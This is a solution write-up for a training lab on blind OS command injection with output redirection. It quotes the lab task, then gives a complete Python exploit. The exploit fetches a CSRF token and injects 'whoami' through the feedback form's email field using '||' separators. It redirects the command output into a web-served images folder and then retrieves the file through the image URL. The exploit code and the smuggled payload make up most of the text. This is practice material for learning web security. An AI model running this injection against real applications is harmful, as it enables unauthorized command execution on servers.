# Blind OS command injection with output redirection
> This lab contains a blind OS command injection vulnerability in the feedback function.
> The application executes a shell command containing the user-supplied details. The output from the command is not returned in the response. However, you can use output redirection to capture the output from the command. There is a writable folder at:
> `/var/www/images/`
> The application serves the images for the product catalog from this location. You can redirect the output from the injected command to a file in this folder, and then use the image loading URL to retrieve the contents of the file.
> To solve the lab, execute the `whoami` command and retrieve the output.

```python
import requests
from bs4 import BeautifulSoup

# --- Configuration ---
# Replace with your specific lab ID
BASE_URL = "https://YOUR-LAB-ID-HERE.web-security-academy.net"

def exploit(url):
    # Endpoints
    form_url = url + "/feedback"
    submit_url = url + "/feedback/submit"
    retrieve_url = url + "/image?filename=whoami.txt"
    
    session = requests.Session()
    
    # 1. Get CSRF Token
    resp = session.get(form_url)
    soup = BeautifulSoup(resp.text, 'html.parser')
    csrf_token = soup.find("input", {"name": "csrf"})['value']
    
    # 2. Inject Payload
    payload = {
        "csrf": csrf_token,
        "name": "Exploit",
        "email": "test@test.com||whoami>/var/www/images/whoami.txt||",
        "subject": "Test",
        "message": "Payload"
    }
    session.post(submit_url, data=payload)
    
    # 3. Retrieve Output
    r = session.get(retrieve_url)
    print(r.text)

if __name__ == "__main__":
    exploit(BASE_URL)
```